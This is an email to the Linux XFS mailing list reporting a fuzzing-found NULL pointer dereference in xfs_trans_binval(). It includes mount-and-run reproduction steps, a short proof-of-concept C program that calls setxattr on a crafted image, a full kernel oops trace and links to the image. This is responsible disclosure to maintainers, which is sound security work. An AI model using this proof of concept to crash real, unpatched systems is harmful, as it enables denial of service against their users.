Return-Path: <linux-xfs-owner@vger.kernel.org>
Received: from mail-by2nam01on0098.outbound.protection.outlook.com ([104.47.34.98]:41147
        "EHLO NAM01-BY2-obe.outbound.protection.outlook.com"
        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
        id S932618AbeFGUlI (ORCPT <rfc822;linux-xfs@vger.kernel.org>);
        Thu, 7 Jun 2018 16:41:08 -0400
From: "Xu, Wen" <wen.xu@gatech.edu>
Subject: NULL pointer dereference in xfs_trans_binval() when mounting and
 operating a crafted xfs image
Date: Thu, 7 Jun 2018 20:41:01 +0000
Message-ID: <66348561-0B03-4CAE-893A-25161D66D6AF@gatech.edu>
Content-Language: en-US
Content-Type: text/plain; charset="us-ascii"
Content-ID: <331CA32FBC370F4CAA66A79D2733BBE0@namprd07.prod.outlook.com>
Content-Transfer-Encoding: 8BIT
MIME-Version: 1.0
Sender: linux-xfs-owner@vger.kernel.org
List-ID: <linux-xfs.vger.kernel.org>
List-Id: xfs
To: "linux-xfs@vger.kernel.org" <linux-xfs@vger.kernel.org>

Dear XFS developers,

There is a NULL pointer dereference in xfs_trans_binval() when mounting and operating a crafted xfs image in 4.17-rc7 w/ for-next branch found by fuzzing.

- Reproduce
# mkdir mnt
# mount -t xfs 0.img mnt
# gcc -o poc poc.c
# ./poc ./mnt

- POC (poc.c)
#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/xattr.h>

#include <dirent.h>
#include <errno.h>
#include <error.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <linux/falloc.h>
#include <linux/loop.h>

static void activity(char *mpoint) {

  char *xattr;
  int err;

  err = asprintf(&xattr, "%s/foo/bar/xattr", mpoint);

  // xattr
  char buf2[113];
  memset(buf2, 0, sizeof(buf2));
  setxattr(xattr, "user.md5", buf2, sizeof(buf2), XATTR_CREATE);

}

int main(int argc, char *argv[]) {
  activity(argv[1]);
  return 0;
}

- Kernel Message
[  330.099346] BUG: unable to handle kernel NULL pointer dereference at 00000000000000e8
[  330.101061] PGD 80000001e0c03067 P4D 80000001e0c03067 PUD 1de4d2067 PMD 0
[  330.102498] Oops: 0000 [#1] SMP KASAN PTI
[  330.103324] Modules linked in: snd_hda_codec_generic snd_hda_intel snd_hda_codec snd_hwdep snd_hda_core snd_pcm snd_timer snd i2c_piix4 mac_hid soundcore ib_iser rdma_cm iw_cm ib_cm ib_core iscsi_tcp libiscsi_tcp libiscsi scsi_transport_iscsi autofs4 raid10 raid456 async_raid6_recov async_memcpy async_pq async_xor async_tx raid1 raid0 multipath linear 8139too qxl crct10dif_pclmul drm_kms_helper syscopyarea crc32_pclmul sysfillrect sysimgblt fb_sys_fops ttm drm aesni_intel aes_x86_64 crypto_simd cryptd 8139cp glue_helper mii pata_acpi floppy
[  330.113023] CPU: 0 PID: 1348 Comm: a.out Tainted: G    B   W         4.17.0-rc5+ #7
[  330.114576] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
[  330.116510] RIP: 0010:xfs_trans_binval+0x24/0x1b0
[  330.117476] RSP: 0018:ffff8801de3e75b0 EFLAGS: 00010292
[  330.118549] RAX: 0000000000000000 RBX: ffff8801de3e79c0 RCX: 0000000000000000
[  330.120002] RDX: 0000000000000000 RSI: 0000000000000297 RDI: 0000000000000297
[  330.121458] RBP: ffff8801de3e75d8 R08: ffffed003e803ebb R09: ffffed003e803ebb
[  330.122911] R10: 0000000000000001 R11: ffffed003e803eba R12: ffff8801eb128460
[  330.124374] R13: 0000000000000001 R14: 0000000000000000 R15: ffff8801eb128460
[  330.125829] FS:  00007fb348ac0700(0000) GS:ffff8801f4000000(0000) knlGS:0000000000000000
[  330.127474] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  330.128659] CR2: 00000000000000e8 CR3: 00000001e9efc000 CR4: 00000000000006f0
[  330.130106] Call Trace:
[  330.130628]  xfs_da_shrink_inode+0x15e/0x2d0
[  330.131511]  ? xfs_da3_swap_lastblock+0xcb0/0xcb0
[  330.132488]  xfs_attr_shortform_to_leaf+0x483/0x4d0
[  330.133490]  ? xfs_attr3_leaf_add+0x370/0x370
[  330.134389]  ? kasan_unpoison_shadow+0x36/0x50
[  330.135306]  ? kasan_kmalloc+0xad/0xe0
[  330.136082]  ? __kmalloc+0x11f/0x240
[  330.136837]  ? kmem_alloc+0x91/0x120
[  330.137579]  ? kmem_alloc+0x91/0x120
[  330.138327]  ? xfs_attr_shortform_bytesfit+0x119/0x2a0
[  330.139385]  ? memset+0x31/0x40
[  330.140041]  xfs_attr_set+0x5e2/0x730
[  330.140814]  ? xfs_attr_get+0x230/0x230
[  330.141613]  ? save_stack+0xb5/0xd0
[  330.142339]  ? __kmalloc_node+0x11e/0x2e0
[  330.143169]  ? kvmalloc_node+0x75/0x80
[  330.143945]  ? setxattr+0x114/0x260
[  330.144682]  ? path_setxattr+0x134/0x170
[  330.145493]  ? __x64_sys_setxattr+0x6d/0x80
[  330.146356]  ? do_syscall_64+0x78/0x170
[  330.147156]  ? legitimize_path.isra.28+0x61/0xa0
[  330.148107]  xfs_xattr_set+0x66/0xb0
[  330.148909]  __vfs_setxattr+0x7c/0xa0
[  330.149669]  __vfs_setxattr_noperm+0x8d/0x200
[  330.150563]  vfs_setxattr+0xb3/0xc0
[  330.151286]  setxattr+0x1b3/0x260
[  330.151974]  ? vfs_setxattr+0xc0/0xc0
[  330.152741]  ? filename_lookup+0x191/0x280
[  330.153582]  ? filename_parentat+0x2b0/0x2b0
[  330.154458]  ? kasan_kmalloc+0xad/0xe0
[  330.155232]  ? kasan_check_write+0x14/0x20
[  330.156072]  ? strncpy_from_user+0xa8/0x1c0
[  330.156944]  ? __mnt_is_readonly.part.13+0x23/0x30
[  330.157923]  ? __mnt_want_write+0x9d/0xb0
[  330.158749]  path_setxattr+0x134/0x170
[  330.159523]  ? setxattr+0x260/0x260
[  330.160255]  __x64_sys_setxattr+0x6d/0x80
[  330.161086]  do_syscall_64+0x78/0x170
[  330.161843]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[  330.162870] RIP: 0033:0x7fb3485e11fa
[  330.163605] RSP: 002b:00007fff0ecbe3c8 EFLAGS: 00000202 ORIG_RAX: 00000000000000bc
[  330.165142] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007fb3485e11fa
[  330.166577] RDX: 00007fff0ecbe4b0 RSI: 0000000000401498 RDI: 0000000000bce0c0
[  330.168018] RBP: 00007fff0ecbe530 R08: 0000000000000001 R09: 0000000000000001
[  330.169470] R10: 0000000000000071 R11: 0000000000000202 R12: 0000000000400c20
[  330.170906] R13: 00007fff0ecbe630 R14: 0000000000000000 R15: 0000000000000000
[  330.172351] Code: 4d 85 e4 75 d7 eb 81 66 66 66 66 90 55 48 89 e5 41 57 49 89 ff 41 56 48 8d be e8 00 00 00 41 55 41 54 53 49 89 f6 e8 0c 14 cc ff <4d> 8b a6 e8 00 00 00 66 66 66 66 90 49 8d 9c 24 90 00 00 00 48
[  330.176167] RIP: xfs_trans_binval+0x24/0x1b0 RSP: ffff8801de3e75b0
[  330.177431] CR2: 00000000000000e8
[  330.178160] ---[ end trace e7495c72c0d9a35f ]---

- Reason
https://elixir.bootlin.com/linux/latest/source/fs/xfs/xfs_trans_buf.c#L610
bp is NULL when calling xfs_trans_binval().

Reported by Wen Xu (wen.xu@gatech.edu) from SSLab at Gatech.

Files:
0.img.zip: https://bugzilla.kernel.org/attachment.cgi?id=276373
Kernel config: https://bugzilla.kernel.org/attachment.cgi?id=276375